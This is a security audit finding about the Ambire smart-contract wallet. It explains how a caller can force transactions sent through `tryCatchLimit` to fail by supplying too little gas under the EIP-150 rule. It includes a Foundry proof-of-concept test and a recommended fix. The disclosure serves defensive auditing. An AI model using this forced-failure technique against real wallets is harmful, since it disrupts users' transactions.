# [adriro-NEW-M-01]: Forced failure of transactions that use `tryCatchLimit`

The same attack described in M-02 can also be exploited with transactions that use `tryCatchLimit`.

## Impact

Similar to `tryCatch()`, the `tryCatchLimit()` function can be used to execute a transaction that is allowed to fail, with a given gas limit:

https://github.com/AmbireTech/ambire-common/blob/v2/contracts/AmbireAccount.sol#L122-L126

```solidity
122: 	function tryCatchLimit(address to, uint256 value, bytes calldata data, uint256 gasLimit) external payable {
123: 		require(msg.sender == address(this), 'ONLY_IDENTITY_CAN_CALL');
124: 		(bool success, bytes memory returnData) = to.call{ value: value, gas: gasLimit }(data);
125: 		if (!success) emit LogErr(to, value, data, returnData);
126: 	}
```

Even though the gas limit is explicitly defined, this doesn't necessarily mean that the transaction is executed with that amount of gas. As the yellow paper states, the cap will be determined by the minimum of the available gas and the defined limit (note that `L` is the function that subtracts 1/64 of the given amount):

![yp](https://i.ibb.co/F8XWJGW/Screen-Shot-2023-06-17-at-15-41-18.png)

This is also noted in [evm.codes](https://www.evm.codes/):

> From the Tangerine Whistle fork, gas is capped at all but one 64th (remaining_gas / 64) of the remaining gas of the current context. If a call tries to send more, the gas is changed to match the maximum allowed.

This effectively means that the same attack described in M-02 can be applied to the `tryCatchLimit()` function.

## Proof of concept

The following test is an adaptation of the original test in M-02 to demonstrate the presence of the issue in the `tryCatchLimit()` function.

```solidity
function test_AmbireAccount_ForceFailTryCatchLimit() public {
    address user = makeAddr("user");

    address[] memory addrs = new address[](1);
    addrs[0] = user;
    AmbireAccount account = new AmbireAccount(addrs);

    TestTryCatch testTryCatch = new TestTryCatch();

    AmbireAccount.Transaction[] memory txns = new AmbireAccount.Transaction[](1);
    txns[0].to = address(account);
    txns[0].value = 0;
    txns[0].data = abi.encodeWithSelector(
        AmbireAccount.tryCatchLimit.selector,
        address(testTryCatch),
        uint256(0),
        abi.encodeWithSelector(TestTryCatch.test.selector),
        500_000
    );

    // This should actually be a call to "execute", we simplify the case using "executeBySender"
    // to avoid the complexity of providing a signature. Core issue remains the same.
    vm.expectEmit(true, false, false, false);
    emit LogErr(address(testTryCatch), 0, "", "");
    vm.prank(user);
    account.executeBySender{gas: 450_000}(txns);

    // assert call to TestTryCatch failed
    assertEq(testTryCatch.foo(0), 0);
}
```

## Recommendation

The same original recommendation given in M-02 can also be applied to `tryCatchLimit()`. 

As previously mentioned, note also that the call may not receive the specified amount of gas if the calling context doesn't have that amount of gas (including overhead costs and the 1/64 saved by EIP-150). This should be manually required if the intention is to ensure the call gets the specified amount of gas.
